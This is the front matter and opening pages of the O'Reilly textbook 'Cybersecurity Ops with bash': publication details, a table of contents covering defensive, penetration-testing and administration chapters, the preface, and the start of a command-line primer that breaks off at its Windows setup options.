Paul Troncone & 
 Carl Albing, PhD
Cybersecurity  
Ops with bash
Attack, Defend, and Analyze from  
the Command Line
Paul Troncone and Carl Albing
Cybersecurity Ops with bash
Attack, Defend, and Analyze from the
Command Line
Boston
Farnham
Sebastopol
Tokyo
Beijing
Boston
Farnham
Sebastopol
Tokyo
Beijing
978-1-492-04131-3
[LSI]
Cybersecurity Ops with bash
by Paul Troncone and Carl Albing
Copyright © 2019 Digadel Corp & Carl Albing. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://oreilly.com). For more information, contact our corporate/institutional
sales department: 800-998-9938 or corporate@oreilly.com.
Acquisitions Editor: Rachel Roumeliotis
Developmental Editors: Virginia Wilson and John
Devins
Production Editor: Nan Barber
Copyeditor: Sharon Wilkey
Proofreader: Christina Edwards
Indexer: Ellen Troutman-Zaig
Interior Designer: David Futato
Cover Designer: Karen Montgomery
Illustrator: Rebecca Demarest
April 2019:
 First Edition
Revision History for the First Edition
2019-04-01: First Release
2020-04-24: Second Release
See http://oreilly.com/catalog/errata.csp?isbn=9781492041313 for release details.
The O’Reilly logo is a registered trademark of O’Reilly Media, Inc. Cybersecurity Ops with bash, the cover
image, and related trade dress are trademarks of O’Reilly Media, Inc.
The views expressed in this work are those of the authors, and do not represent the publisher’s views.
While the publisher and the authors have used good faith efforts to ensure that the information and
instructions contained in this work are accurate, the publisher and the authors disclaim all responsibility
for errors or omissions, including without limitation responsibility for damages resulting from the use of
or reliance on this work. Use of the information and instructions contained in this work is at your own
risk. If any code samples or other technology this work contains or describes is subject to open source
licenses or the intellectual property rights of others, it is your responsibility to ensure that your use
thereof complies with such licenses and/or rights.
To Erin and Kiera. You bring joy to every moment of my life.
—Paul
 
To Cynthia, and our sons Greg, Eric, and Andrew.
—Carl
Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii
Nonrepudiation                                                                                                          38
Authentication                                                                                                            38
The Attack Life Cycle                                                                                                    39
Reconnaissance                                                                                                           39
Initial Exploitation                                                                                                     40
Establish Foothold                                                                                                      40
Escalate Privileges                                                                                                      40
Internal Reconnaissance                                                                                           41
Lateral Movement                                                                                                      41
Maintain Presence                                                                                                      41
vi 
| 
Table of Contents
Complete Mission                                                                                                      41
Summary                                                                                                                         42
Part II. 
Defensive Security Operations with bash
5. Data Collection. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  45
Commands in Use                                                                                                         46
cut                                                                                                                                 46
file                                                                                                                                 47
head                                                                                                                              48
reg                                                                                                                                 48
wevtutil                                                                                                                        48
Gathering System Information                                                                                    49
Executing a Command Remotely Using SSH                                                        50
Gathering Linux Logfiles                                                                                           50
Gathering Windows Logfiles                                                                                    51
Gathering System Information                                                                                54
Gathering the Windows Registry                                                                             58
Searching the Filesystem                                                                                               59
Searching by Filename                                                                                               59
Searching for Hidden Files                                                                                       59
Searching by File Size                                                                                                60
Searching by Time                                                                                                      61
Searching for Content                                                                                                62
Searching by File Type                                                                                               63
Searching by Message Digest Value                                                                         67
Transferring Data                                                                                                           69
Summary                                                                                                                         70
Workshop                                                                                                                        70
6. Data Processing. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  73
Commands in Use                                                                                                         73
awk                                                                                                                               73
join                                                                                                                                74
sed                                                                                                                                 75
tail                                                                                                                                 76
tr                                                                                                                                   76
Processing Delimited Files                                                                                           78
Iterating Through Delimited Data                                                                           79
Processing by Character Position                                                                            80
Processing XML                                                                                                             80
Table of Contents 
| 
vii
Processing JSON                                                                                                            82
Aggregating Data                                                                                                           84
Summary                                                                                                                         85
Workshop                                                                                                                        85
7. Data Analysis. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  87
Commands in Use                                                                                                         87
sort                                                                                                                                87
uniq                                                                                                                              88
Web Server Access Log Familiarization                                                                      89
Sorting and Arranging Data                                                                                         90
Counting Occurrences in Data                                                                                    91
Totaling Numbers in Data                                                                                            95
Displaying Data in a Histogram                                                                                  96
Finding Uniqueness in Data                                                                                       102
Identifying Anomalies in Data                                                                                   104
Summary                                                                                                                       107
Workshop                                                                                                                      107
8. Real-Time Log Monitoring. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  109
Monitoring Text Logs                                                                                                  109
Log-Based Intrusion Detection                                                                              111
Monitoring Windows Logs                                                                                        112
Generating a Real-Time Histogram                                                                          113
Summary                                                                                                                       118
Workshop                                                                                                                      119
9. Tool: Network Monitor. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  121
Commands in Use                                                                                                       121
crontab                                                                                                                       122
schtasks                                                                                                                      122
Step 1: Creating a Port Scanner                                                                                 122
Step 2: Comparing to Previous Output                                                                    125
Step 3: Automation and Notification                                                                        127
Scheduling a Task in Linux                                                                                     129
Scheduling a Task in Windows                                                                              130
Summary                                                                                                                       130
Workshop                                                                                                                      131
10. Tool: Filesystem Monitor. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  133
Commands in Use                                                                                                       133
sdiff                                                                                                                             133
viii 
| 
Table of Contents
Step 1: Baselining the Filesystem                                                                               134
Step 2: Detecting Changes to the Baseline                                                               135
Step 3: Automation and Notification                                                                        137
Summary                                                                                                                       141
Workshop                                                                                                                      141
11. Malware Analysis. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  143
Commands in Use                                                                                                       143
curl                                                                                                                             143
vi                                                                                                                                 144
xxd                                                                                                                              145
Reverse Engineering                                                                                                    146
Hexadecimal, Decimal, Binary, and ASCII Conversions                                   146
Analyzing with xxd                                                                                                  147
Extracting Strings                                                                                                        149
Interfacing with VirusTotal                                                                                        150
Searching the Database by Hash Value                                                                 151
Scanning a File                                                                                                          156
Scanning URLs, Domains, and IP Addresses                                                      156
Summary                                                                                                                       157
Workshop                                                                                                                      157
12. Formatting and Reporting. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  159
Commands in Use                                                                                                       159
tput                                                                                                                             159
Formatting for Display and Print with HTML                                                        160
Creating a Dashboard                                                                                                 165
Summary                                                                                                                       169
Workshop                                                                                                                      169
Part III. 
Penetration Testing with bash
13. Reconnaissance. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  173
Commands in Use                                                                                                       173
ftp                                                                                                                               173
Crawling Websites                                                                                                       174
Automated Banner Grabbing                                                                                     175
Summary                                                                                                                       180
Workshop                                                                                                                      180
Table of Contents 
| 
ix
14. Script Obfuscation. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  181
Commands in Use                                                                                                       181
base64                                                                                                                         181
eval                                                                                                                             182
Obfuscating Syntax                                                                                                      182
Obfuscating Logic                                                                                                        184
Encrypting                                                                                                                    187
Cryptography Primer                                                                                              187
Encrypting the Script                                                                                               188
Creating the Wrapper                                                                                              189
Creating Your Own Crypto                                                                                    190
Summary                                                                                                                       197
Workshop                                                                                                                      197
15. Tool: Command-Line Fuzzer. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  199
Implementation                                                                                                            200
Summary                                                                                                                       204
Workshop                                                                                                                      204
16. Establishing a Foothold. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  207
Commands in Use                                                                                                       207
nc                                                                                                                                207
Single-Line Backdoors                                                                                                208
Reverse SSH                                                                                                              208
Bash Backdoor                                                                                                          209
Custom Remote-Access Tool                                                                                     210
Implementation                                                                                                        211
Summary                                                                                                                       216
Workshop                                                                                                                      216
Part IV. 
Security Administration with bash
17. Users, Groups, and Permissions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  219
Commands in Use                                                                                                       219
chmod                                                                                                                        219
chown                                                                                                                         220
getfacl                                                                                                                         220
groupadd                                                                                                                   220
setfacl                                                                                                                         220
useradd                                                                                                                      221
usermod                                                                                                                     221
x 
| 
Table of Contents
icacls                                                                                                                           221
net                                                                                                                               222
Users and Groups                                                                                                        222
Creating Linux Users and Groups                                                                         222
Creating Windows Users and Groups                                                                   223
File Permissions and Access Control Lists                                                               225
Linux File Permissions                                                                                            225
Windows File Permissions                                                                                      226
Making Bulk Changes                                                                                                 227
Summary                                                                                                                       228
Workshop                                                                                                                      228
18. Writing Log Entries. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  229
Commands in Use                                                                                                       229
eventcreate                                                                                                                 229
logger                                                                                                                         230
Writing Windows Logs                                                                                               230
Writing Linux Logs                                                                                                      231
Summary                                                                                                                       232
Workshop                                                                                                                      232
19. Tool: System Availability Monitor. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  233
Commands in Use                                                                                                       233
ping                                                                                                                            233
Implementation                                                                                                            234
Summary                                                                                                                       236
Workshop                                                                                                                      236
20. Tool: Software Inventory. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  237
Commands in Use                                                                                                       238
apt                                                                                                                               238
dpkg                                                                                                                            238
wmic                                                                                                                           239
yum                                                                                                                            239
Implementation                                                                                                            240
Identifying Other Software                                                                                         241
Summary                                                                                                                       242
Workshop                                                                                                                      243
21. Tool: Validating Configuration. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  245
Implementation                                                                                                            245
Summary                                                                                                                       250
Table of Contents 
| 
xi
Workshop                                                                                                                      251
22. Tool: Account Auditing. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  253
Have I Been Pwned?                                                                                                    253
Checking for a Breached Password                                                                           254
Checking for a Breached Email Address                                                                  256
Batch-Processing Emails                                                                                         260
Summary                                                                                                                       261
Workshop                                                                                                                      261
23. Conclusion. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  263
Index. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  265
xii 
| 
Table of Contents
Preface
What is of the greatest importance in war is extraordinary speed: one cannot afford to
neglect opportunity.
—Sun Tzu, The Art of War
In this day and age, the command line is sometimes overlooked. New cybersecurity
practitioners may be lured away by tools with flashy graphical interfaces. More-
experienced operators may dismiss or underestimate its value. However, the com‐
mand line provides a wealth of capability and should be part of every practitioner’s
toolkit. As an example, the seemingly simple tail command that outputs the last few
lines of a specified file is over 2,000 lines of C code. You could create a similar tool
using Python or another programming language, but why do so when you can access
its capabilities by simply invoking it from the command line?
Additionally, learning how to use the command line for complex tasks gives you a
better understanding of the way an operating system functions. The most capable
cybersecurity practitioners understand how tools work at a fundamental level, not
just how to use them.
Cybersecurity Ops with bash teaches you how to leverage sophisticated Linux com‐
mands and the bash shell to enhance your capabilities as a security operator and
practitioner. By learning these skills you will be able to rapidly create and prototype
complex capabilities with as little as a single line of pipelined commands.
Although the bash shell and the commands we discuss throughout this book origina‐
ted in the Unix and Linux family of operating systems, they are now ubiquitous. The
techniques are easily transferable between Linux, Windows, and macOS environ‐
ments.
xiii
Who This Book Is For
Cybersecurity Ops with bash is written for those who wish to achieve mastery of the
command line in the context of computer security. The goal is not to replace existing
tools with command-line scripts, but rather to teach you how to use the command
line so you can leverage it to augment your existing security capabilities.
Throughout this book, we focus examples on security techniques such as data collec‐
tion, analysis, and penetration testing. The purpose of these examples is to demon‐
strate the command line’s capabilities and give you insight into some of the
fundamental techniques used by higher-level tools.
This book assumes basic familiarity with cybersecurity, the command-line interface,
programming concepts, and the Linux and Windows operating systems. Prior knowl‐
edge of bash is useful but not necessarily needed.
This book is not an introduction to programming, although some general concepts
are covered in Part I.
Bash or bash
Throughout this book, we refer to the bash shell by using a lowercase letter b unless it
is the first word in a sentence or is referencing the Windows program Git Bash. This
convention is based on guidance provided by Chet Ramey, who is the current main‐
tainer of the software. For more information on bash, visit the bash website. For more
information on the various releases of bash, reference documentation, and examples,
visit the bash Cookbook wiki page.
Script Robustness
The example scripts in this book are written to illustrate and teach concepts. The
scripts are not designed to be efficient or robust enough for enterprise deployment.
Use caution if you choose to use the scripts in a live environment. Be sure to follow
programming best practices and test your scripts before deployment.
Workshops
We provide thought-provoking questions and practice problems at the end of each
chapter to help you build your security, command-line, and bash skills. You can find
solutions to some of these exercises and additional resources at the Cybersecurity
Ops website.
xiv 
| 
Preface
Conventions Used in This Book
The following typographical conventions are used in this book:
Italic
Indicates new terms, URLs, email addresses, filenames, and file extensions.
Constant width
Used for program listings, as well as within paragraphs to refer to program ele‐
ments such as variable or function names, databases, data types, environment
variables, statements, and keywords.
Constant width bold
Shows commands or other text that should be typed literally by the user.
Constant width italic
Shows text that should be replaced with user-supplied values or by values deter‐
mined by context.
This element signifies a tip or suggestion.
This element signifies a general note.
This element indicates a warning or caution.
Using Code Examples
This book is here to help you get your job done. In general, if example code is offered
with this book, you may use it in your programs and documentation. You do not
need to contact us for permission unless you’re reproducing a significant portion of
the code. For example, writing a program that uses several chunks of code from this
book does not require permission. Selling or distributing a CD-ROM of examples
from O’Reilly books does require permission. Answering a question by citing this
book and quoting example code does not require permission. Incorporating a signifi‐
Preface 
| 
xv
cant amount of example code from this book into your product’s documentation does
require permission.
We appreciate, but do not require, attribution. An attribution usually includes the
title, author, publisher, and ISBN. For example: “Cybersecurity Ops with bash by Paul
Troncone and Carl Albing (O’Reilly). Copyright 2019 Digadel Corp & Carl Albing,
978-1-492-04131-3.”
If you feel your use of code examples falls outside fair use or the permission given
above, feel free to contact us at permissions@oreilly.com.
O’Reilly Online Learning
For almost 40 years, O’Reilly Media has provided technology
and business training, knowledge, and insight to help compa‐
nies succeed.
Our unique network of experts and innovators share their knowledge and expertise
through books, articles, and our online learning platform. O’Reilly’s online learning
platform gives you on-demand access to live training courses, in-depth learning
paths, interactive coding environments, and a vast collection of text and video from
O’Reilly and 200+ other publishers. For more information, visit http://oreilly.com.
How to Contact Us
Please address comments and questions concerning this book to the publisher:
O’Reilly Media, Inc.
1005 Gravenstein Highway North
Sebastopol, CA 95472
800-998-9938 (in the United States or Canada)
707-829-0515 (international or local)
707-829-0104 (fax)
We have a web page for this book, where we list errata, examples, and any additional
information. You can access this page at http://bit.ly/cybersecurity-ops-bash.
To comment or ask technical questions about this book, send email to bookques‐
tions@oreilly.com.
For news and more information about our books and courses, see our website at
http://www.oreilly.com.
Find us on Facebook: http://facebook.com/oreilly
xvi 
| 
Preface
Follow us on Twitter: http://twitter.com/oreillymedia
Watch us on YouTube: http://www.youtube.com/oreillymedia
Acknowledgments
We would like to thank our two primary technical reviewers for their insight and for
helping us to ensure the accuracy of this book and maximum value to the reader.
Tony Lee, Senior Technical Director at Cylance Inc., is a security enthusiast who regu‐
larly shares knowledge at LinkedIn and SecuritySynapse. Chet Ramey, Senior Tech‐
nology Architect in the Information Technology Services division of Case Western
Reserve University, is the current maintainer of bash.
Thank you also to Bill Cooper, Josiah Dykstra, Ric Messier, Cameron Newham, San‐
dra Schiavo, and JP Vossen for their guidance and critiques.
Finally, we would like to thank the entire O’Reilly team, especially Nan Barber, John
Devins, Mike Loukides, Sharon Wilkey, Ellen Troutman-Zaig, Christina Edwards,
and Virginia Wilson.
Disclaimer
The opinions expressed in this book are the authors’ own and do not reflect the view
of the United States government.
Preface 
| 
xvii
PART I
Foundations
Give me six hours to chop down a tree, and I will spend the first four sharpening the
axe.
—Unknown
 
In Part I, we begin with a primer on the command line, bash shell, and regular
expressions, and review the fundamental principles of cybersecurity.
CHAPTER 1
Command-Line Primer
A computer’s command-line interface gives you an intimate connection with its oper‐
ating system (OS). Within the operating system lives an astounding amount of func‐
tionality that has been honed and perfected over decades of use and development.
Sadly, the ability to interact with the OS by using the command line is quickly becom‐
ing a lost art. It has been replaced instead by graphical user interfaces (GUIs), which
often increase ease of use at the expense of speed and flexibility, and distance the user
from the underlying capabilities.
The ability to effectively use the command line is a critical skill for security practi‐
tioners and administrators. Many tools of the trade such as Metasploit, Nmap, and
Snort require command-line proficiency simply to use them. During penetration test‐
ing, your only option may be to use a command-line interface when interacting with
a target system, particularly in the early stages of an intrusion.
In order to build a solid foundation, we will begin with an overview of the command
line and its components; then we will look at how it can be applied to enhance your
cybersecurity capabilities.
The Command Line Defined
Throughout this book, the term command line is used to refer to all of the various
non-GUI executables installed with an operating system, along with, and especially,
the built-ins, keywords, and scripting capabilities available from the shell—its
command-line interface.
To effectively utilize the command line, you need two things: an understanding of the
features and options of the existing commands, and a way to sequence commands
together by using a scripting language.
1
In this book, we introduce more than 40 commands that span both the Linux and
Windows operating systems, as well as a variety of shell built-ins and keywords. Most
of the commands introduced originate from the Linux environment, but as you will
see, there are multiple methods for running them on Windows platforms.
Why bash?
For scripting purposes, we choose the bash shell and command language. The bash
shell has been around for decades, is available in nearly every version of Linux, and
has even permeated the Windows operating system. That makes bash an ideal tech‐
nology for security operations because the techniques and scripts are cross-platform.
The pervasiveness of bash also gives offensive operators and penetration testers a par‐
ticular advantage, because in many cases there is no additional supporting infrastruc‐
ture or interpreters to install on a target system.
Command-Line Illustrations
This book makes heavy use of the command line through numerous examples. A
single-line command illustration will appear as follows:
ls -l
If the single-line command illustration also displays output, it will appear as follows:
$ ls -l
-rw-rw-r-- 1 dave dave  15 Jun 29 13:49 hashfilea.txt
-rwxrw-r-- 1 dave dave 627 Jun 29 13:50 hashsearch.sh
Note the use of the $ character in the illustration that includes output. The leading $
character is not part of the command, but is meant to represent the simple prompt of
the shell command line. It is shown to help you differentiate between the command
(as you would type it) and its output to the terminal. The blank line separating the
command from its output in these examples will not appear when you run the com‐
mand. Again, this is to separate the command from the output of the command.
Windows command examples are run using Git Bash, not the Windows command
prompt unless explicitly stated.
Running Linux and bash on Windows
The bash shell and the commands we discuss are installed by default on virtually all
distributions of Linux. The same is not true for the Windows environment. Thank‐
fully, there are a variety of methods for running Linux commands and bash scripts on
Windows systems. The four options we cover here are Git Bash, Cygwin, the Win‐
dows Subsystem for Linux, and the Windows Command Prompt and PowerShell.
2 
| 
Chapter 1: Command-Line Primer
Git Bash
You can run many standard Linux commands and the bash shell in the Windows
environment if you have installed Git, which includes a port of bash. Git Bash is the
method of choice for the examples presented in this book because of its popularity,
and its ability to run standard Linux and bash commands as well as call many native
Windows commands.
You can download Git from the Git website. Once it’s installed, you can run bash by
right-clicking on the desktop or in a folder and selecting Git Bash Here.
Cygwin
